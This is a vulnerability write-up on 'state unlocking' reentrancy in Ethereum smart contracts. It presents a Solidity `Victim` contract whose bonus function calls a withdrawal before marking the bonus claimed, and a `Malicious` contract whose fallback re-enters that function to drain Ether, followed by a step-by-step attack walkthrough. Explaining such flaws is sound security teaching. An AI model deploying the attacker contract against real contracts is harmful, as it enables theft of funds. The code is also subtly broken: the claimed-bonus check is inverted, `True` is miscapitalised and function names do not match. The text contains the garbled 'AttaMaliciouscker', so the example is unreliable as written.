# State_unlocking_reentrancy

## Vendor
State-unlocking reentrancy

## Vulnerability Type
State Unlocking Reentrancy Bug

## Abstract
We found a common but uneasy-detection state-unlocking reentrancy attack scenario in Ethereum smart contracts, where an attacker can undesirably re-enter a function to steal money. The attack scenario can be abstracted as: (1) given a contract `Victim` containing one transfer function `WithdrawReward` and invocation function `GetFirstWithdrawBonus`. (2) Once function `GetFirstWithdrawBonus` of contract *Victim* is called, it will get a bonus by invoking the function `WithdrawReward`, the `fallback` function of `Malicious` is automatically activated. (3) In its `fallback` function, `Malicious` calls function `GetFirstWithdrawBonus`, which will undesirably invoke the function `WithdrawReward` to transfer money to `Malicious` again. 

## Details
We present a typical example of state unlocking reentrancy in the figure below.

<div align=center><img width="480" height="190" src="./images/state_unlocking.png"/></div>
<div align=center>Figure 1 An example of state unlocking reentrancy</div>

Contract `Vulnerable` contains a transfer function `WithdrawReward` and an intermediary `GetFirstWithdrawBonus`.
* `GetFirstWithdrawBonus` is an intermediary function, which is used to give the bonus to everyone who applies for the first time.
* `WithdrawReward` is a transfer function, which allows a recipient to withdraw his/her asset.
```
contract Victim {
  ...
  
  // Each recipient should only be able to claim the bonus once
  function WithdrawReward(address recipient) public {
      uint amountToWithdraw = rewardsForA[recipient];
      rewardsForA[recipient] = 0;
      if (recipient.call.value(amountToWithdraw)() == false) {
           throw;
      }
  }

  function GetFirstWithdrawBonus(address recipient) public {
      if (claimedBonus[recipient] == false) {  // Each recipient should only be able to claim the bonus once
           throw;
      }
      rewardsForA[recipient] += 100;
      WithdrawReward(recipient);  // At this point, the caller will be able to execute getFirstWithdrawalBonus again
      claimedBonus[recipient] = True;
  }
}
```

Contract `Malicious` containing the `attack` function and the `fallback` function.
* `attack` initates the first attack operation by calling the function `GetFirstWithdrawBonus`.
* `fallback` calls the function `GetFirstWithdrawBonus`, which is used to invoke the function `WithdrawReward` of contract `Victim`.
```
contract Malicious {
  ...
  
  function attack(){
    vul.GetFirstWithdrawBonus(_owner);
  }

  function () payable{ // fallback function
    count++;
    if(count < 10){
      vul.GetFirstWithdrawBonus(_owner);
    }
  }
}
```

The attack process is as follows:

**Step 1** The contract `Malicious` uses the function `attack` by calling the function `GetFirstWithdrawBonus`, aiming at obatining the bonus (Ether). (attack (Malicious) -> GetFirstWithdrawBonus (Victim))

**Step 2** The function `GetFirstWithdrawBonus` is invoked, therefore, the transfer function `WithdrawReward` of contract `Victim` will be executed. This function will tansfer money to contract `Malicious`. (GetFirstWithdrawBonus (Victim) -> WithdrawReward (Victim))

**Step 3** Once contract `Malicious` recevied the transferred money, it will automatically trigger the `fallback` function of `Malicious`. (WithdrawReward (Victim) -> fallback (Malicious))

**Step 4** The `fallback` function of contract `Malicious` maliciously invokes the function `GetFirstWithdrawBonus` to attempt to obtain Ether again. (fallback (Malicious) -> GetFirstWithdrawBonus (Victim))

**Step 5** Similarly, the function `GetFirstWithdrawBonus` re-enter the function `WithdrawReward` to transfer money to contract `Malicious`, causing the recursive calls. By exploiting the reentrant call, the `Malicious` can access the contract `Victim` to steal Ether until all its Ether is exhausted. (GetFirstWithdrawBonus (Victim) -> WithdrawReward (Victim) -> fallback (AttaMaliciouscker) -> ...)

## Conclusion
Overall, we would like to highlight that this reentrancy attack utilizes the shared interval states (i.e., intermediary function) to steal Ether from the victim contract. Also, this is a trick of exploiting the control dependencies between functions, causing the reentrancy attack. Even though `getFirstWithdrawalBonus` does not directly execute a transfer operation, the `withdrawReward` called by `getFirstWithdrawalBonus` is enough to make it vulnerable to reentrancy. 

## Reference
https://github.com/Messi-Q/Vulnerabilities/blob/master/Reentrancy_state_unlocking.sol

https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21

https://consensys.github.io/smart-contract-best-practices/known_attacks/



